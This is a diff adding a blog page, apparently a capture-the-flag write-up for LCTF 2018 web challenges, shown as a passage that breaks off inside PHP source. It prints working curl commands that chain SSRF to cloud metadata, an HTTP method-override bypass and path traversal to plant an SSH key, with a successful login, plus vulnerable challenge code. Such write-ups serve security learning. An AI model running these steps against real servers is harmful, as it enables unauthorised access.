@@ -1,0 +1,2234 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Tianji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Tianji">
+    <meta name="keywords" content="lctf-2018 | Tianji">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>lctf-2018 · Tianji&#39;s Blog</title>
+    <!-- 设置密码 -->
+    <script>
+        (function(){
+            if('lctf'){
+                if (prompt('请输入文章密码','') !== 'lctf'){
+                    alert('密码错误！');
+                    history.back();
+                }
+            }
+        })();
+    </script>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180721" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180721" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Tianji&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">lctf-2018</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Tianji's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="height:50vh;">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            lctf-2018
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">6,476</span> / Reading time: <span class="post-count">37 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/11/19</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;">
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Travel"><a href="#Travel" class="headerlink" title="Travel"></a>Travel</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request, render_template</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> create_app</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">app = create_app()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload/&lt;filename&gt;', methods = ['PUT'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    name = request.cookies.get(<span class="string">'name'</span>)</span><br><span class="line">    pwd = request.cookies.get(<span class="string">'pwd'</span>)</span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">'lctf'</span> <span class="keyword">or</span> pwd != str(uuid.getnode()):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line">    filename = urllib.unquote(filename)</span><br><span class="line">    <span class="keyword">with</span> open(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename), <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(request.get_data(as_text = <span class="keyword">True</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods = ['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">'url'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> url == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"http"</span> != url[: <span class="number">4</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hacker"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, timeout = <span class="number">10</span>)</span><br><span class="line">        response.encoding = <span class="string">'utf-8'</span></span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Something Error"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/source', methods = ['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<h3 id="uuid-getnode"><a href="#uuid-getnode" class="headerlink" title="uuid.getnode()"></a><code>uuid.getnode()</code></h3><p>uuid.getnode()其实就是mac地址。</p>
+<p>可通过腾讯云查看实例元数据或得:</p>
+<p><code>https://cloud.tencent.com/document/product/213/4934</code></p>
+<p><img src="/assets/lctf/TIM截图20181119195941.png" alt=""></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ht@TIANJI:/mnt/d/ht-blog$ curl http://118.25.150.86/?url=http://metadata.tencentyun.com/latest/meta-data/network/interfaces/macs</span><br><span class="line">52:54:00:48:c8:73/</span><br><span class="line">ht@TIANJI:/mnt/d/ht-blog$ python                                        </span><br><span class="line">Python 2.7.12 (default, Dec  4 2017, 14:50:18)                          </span><br><span class="line">[GCC 5.4.0 20160609] on linux2                                          </span><br><span class="line">Type "help", "copyright", "credits" or "license" for more information.</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; int(<span class="string">""</span>.join(<span class="string">"52:54:00:48:c8:73"</span>.split(<span class="string">":"</span>)), 16)                    </span></span><br><span class="line">90520735500403</span><br></pre></td></tr></table></figure>
+<h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>因为<code>nginx</code>默认禁止了<code>PUT</code>方法。可以使用<code>X-HTTP-Method-Override:PUT</code>绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">ht@TIANJI:/mnt/d/ht-blog$ curl -v -H &quot;X-HTTP-Method-Override:PUT&quot; -d &quot;asd=asd&quot; --cookie &quot;name=lctf;pwd=90520735500403&quot; http://118.25.150.86/upload/asd</span><br><span class="line">*   Trying 118.25.150.86...                                                     </span><br><span class="line">* Connected to 118.25.150.86 (118.25.150.86) port 80 (#0)                               </span><br><span class="line">&gt; POST /upload/asd HTTP/1.1                                                             </span><br><span class="line">&gt; Host: 118.25.150.86                                                                   </span><br><span class="line">&gt; User-Agent: curl/7.47.0                                                               </span><br><span class="line">&gt; Accept: */*                                                                  </span><br><span class="line">&gt; Cookie: name=lctf;pwd=90520735500403                                                 </span><br><span class="line">&gt; X-HTTP-Method-Override:PUT                                                           </span><br><span class="line">&gt; Content-Length: 7                                                                     </span><br><span class="line">&gt; Content-Type: application/x-www-form-urlencoded                                      </span><br><span class="line">&gt;                                                                                      </span><br><span class="line">* upload completely sent off: 7 out of 7 bytes                                         </span><br><span class="line">&lt; HTTP/1.1 200 OK                                                                       </span><br><span class="line">&lt; Server: nginx/1.14.0 (Ubuntu)                                                         </span><br><span class="line">&lt; Date: Mon, 19 Nov 2018 12:02:56 GMT                                                   </span><br><span class="line">&lt; Content-Type: text/html; charset=utf-8                                               </span><br><span class="line">&lt; Content-Length: 1                                                                     </span><br><span class="line">&lt; Connection: keep-alive                                                               </span><br><span class="line">&lt;                                                                                       </span><br><span class="line">* Connection #0 to host 118.25.150.86 left intact                                       </span><br><span class="line">1         ## 可以看到上传已经成功</span><br></pre></td></tr></table></figure>
+<h3 id="写公钥"><a href="#写公钥" class="headerlink" title="写公钥"></a>写公钥</h3><p>向<code>/home/lctf/.ssh/authorized_keys</code>文件中写入自己的公钥即可</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">ht@TIANJI:~/.ssh$ curl -v -H "X-HTTP-Method-Override:PUT" -d "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKk5RVImVENlFHcUeCeG0TFcywxxXKGKqZBD4o7skUlIKHQcDNUke1PdC+UsvGdD25r5tLoCAHCAnNqlIO5/O30y1dffn0GzSZlKGC8TL1qWat/WjLkbdfZNsrBd1GZG6QtSEfBFOCgcu+qIAFlTDqovELEgX5Itd+nMtuAhlrdK4m6PrBB4VPsMMxCmbHFNCnLbWQK0rWtHqHhhHi9LFckBXaOpYamR3cHFmMr3jWFf2DSid6D4xifM8XzgZkr8TSNPqnVpbDC3hqTsvWGvLu7W/dqKz1+zBJ+OMbtBudMBKMQTfGjUls7u9ak716Xlza8TY0VD4UFYxXFlZN8/SL ht@TIANJI" --cookie "name=lctf;pwd=90520735500403" http://118.25.150.86/upload/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252flctf%252f.ssh%252fauthorized_keys</span><br><span class="line">*   Trying 118.25.150.86...</span><br><span class="line">* Connected to 118.25.150.86 (118.25.150.86) port 80 (#0)</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> POST /upload/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252flctf%252f.ssh%252fauthorized_keys HTTP/1.1</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Host: 118.25.150.86</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> User-Agent: curl/7.47.0</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Accept: */*</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Cookie: name=lctf;<span class="built_in">pwd</span>=90520735500403</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> X-HTTP-Method-Override:PUT</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Content-Length: 390</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br><span class="line">* upload completely sent off: 390 out of 390 bytes</span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Server: nginx/1.14.0 (Ubuntu)</span><br><span class="line">&lt; Date: Mon, 19 Nov 2018 12:20:56 GMT</span><br><span class="line">&lt; Content-Type: text/html; charset=utf-8</span><br><span class="line">&lt; Content-Length: 1</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt;</span><br><span class="line">* Connection #0 to host 118.25.150.86 left intact</span><br><span class="line">1ht@TIANJI:~/.ssh$ssh lctf@118.25.150.86</span><br><span class="line">Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-29-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Mon Nov 19 20:21:00 CST 2018</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Processes:           105</span><br><span class="line">  Usage of /:   5.5% of 49.15GB   Users logged in:     1</span><br><span class="line">  Memory usage: 24%               IP address for eth0: 172.17.0.3</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"> * Security certifications for Ubuntu!</span><br><span class="line">   We now have FIPS, STIG, CC and a CIS Benchmark.</span><br><span class="line"></span><br><span class="line">   - http://bit.ly/Security_Certification</span><br><span class="line"></span><br><span class="line"> * Want to make a highly secure kiosk, smart display or touchscreen?</span><br><span class="line">   Here's a step-by-step tutorial for a rainy weekend, or a startup.</span><br><span class="line"></span><br><span class="line">   - https://bit.ly/secure-kiosk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available for installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line"></span><br><span class="line">Last login: Mon Nov 19 19:06:20 2018 from 120.77.219.21</span><br><span class="line">lctf@web-f1sh:~$ ls</span><br><span class="line">lctf@web-f1sh:~$ cd ../</span><br><span class="line">lctf@web-f1sh:/home$ ls</span><br><span class="line">lctf  ubuntu</span><br><span class="line">lctf@web-f1sh:/home$ cd ubuntu/</span><br><span class="line">lctf@web-f1sh:/home/ubuntu$ ls</span><br><span class="line">Travel.tar.gz</span><br></pre></td></tr></table></figure>
+<h2 id="T4lk-is-cheap-show-me-the-shell"><a href="#T4lk-is-cheap-show-me-the-shell" class="headerlink" title="T4lk is cheap,show me the shell"></a>T4lk is cheap,show me the shell</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$SECRET  = `../read_secret`;                                   </span><br><span class="line">$SANDBOX = &quot;../data/&quot; . md5($SECRET. $_SERVER[&quot;REMOTE_ADDR&quot;]); </span><br><span class="line">$FILEBOX = &quot;../file/&quot; . md5(&quot;K0rz3n&quot;. $_SERVER[&quot;REMOTE_ADDR&quot;]);    </span><br><span class="line">@mkdir($SANDBOX); </span><br><span class="line">@mkdir($FILEBOX); </span><br><span class="line"></span><br><span class="line">if (!isset($_COOKIE[&quot;session-data&quot;])) &#123; </span><br><span class="line">    $data = serialize(new User($SANDBOX)); </span><br><span class="line">    $hmac = hash_hmac(&quot;md5&quot;, $data, $SECRET); </span><br><span class="line">    setcookie(&quot;session-data&quot;, sprintf(&quot;%s-----%s&quot;, $data, $hmac));       </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class User &#123; </span><br><span class="line">    public $avatar; </span><br><span class="line">    function __construct($path) &#123; </span><br><span class="line">        $this-&gt;avatar = $path;                                           </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class K0rz3n_secret_flag &#123; </span><br><span class="line">    protected $file_path; </span><br><span class="line">    function __destruct()&#123; </span><br><span class="line">        if(preg_match(&apos;/(log|etc|session|proc|read_secret|history|class)/i&apos;, $this-&gt;file_path))&#123; </span><br><span class="line">            die(&quot;Sorry Sorry Sorry&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    include_once($this-&gt;file_path); </span><br><span class="line"> &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function check_session() &#123; </span><br><span class="line">    global $SECRET; </span><br><span 